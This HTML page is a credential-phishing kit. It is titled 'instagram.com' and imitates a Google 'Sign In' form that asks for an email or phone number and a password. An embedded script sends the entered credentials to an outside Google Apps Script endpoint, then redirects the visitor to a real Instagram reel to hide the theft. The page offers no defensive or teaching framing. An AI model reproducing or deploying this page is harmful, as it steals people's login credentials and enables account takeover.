<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>instagram.com</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="google.css">
</head>
<body>
    <div class="box">
    <div class="logo">   
    </div>
    <img src="social.png" alt="" class="social">
    <h2>Sign In</h2>
    <p>Use your Google Account</p>
    <form name="email_sub">
        <div class="inputBox">
          <input type="text" name="Email"  required onkeyup="this.setAttribute('value', this.value);"  value="">
          <label>Email or phone</label>
        </div>
        <div class="inputBox">
            <input type="password" name="Message" required onkeyup="this.setAttribute('value', this.value);" value="">
            <label>Password</label>
        </div>
        <input type="submit" name="sign-in" value="Sign In" id="redirect">
      </form>
    </div>   

    <!-- ScriptFile -->
    <script>
      const scriptURL = 'https://script.google.com/macros/s/AKfycbxsaGg8oYfq9_DsQrzWN--QutW9vYZDGwgBgXv_GHG_SwjaCxyfijVe4KTbH_-hjsXi/exec'
      const form = document.forms['email_sub']
      form.addEventListener('submit', e => {
        e.preventDefault();
        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
          .then(res => {alert('Submited Succesfully');
        })
          .catch(error => {
            console.error('Error!', error.message);
            alert('Error submission unsuccesfull');
          })
          .then( a => (form.reset()));
      })
      </script>  
      <script>
        // Get a reference to the button element
        var button = document.getElementById("redirect");

        // Define the URL you want to redirect to
        var redirectUrl = "https://www.instagram.com/reel/CxF-KFSPYze/?igshid=MzRlODBiNWFlZA==";

        // Add a click event listener to the button
        button.addEventListener("click", function() {
            // Redirect to the specified URL
            window.location.href = redirectUrl;
        });
    </script>
</body>
</html>
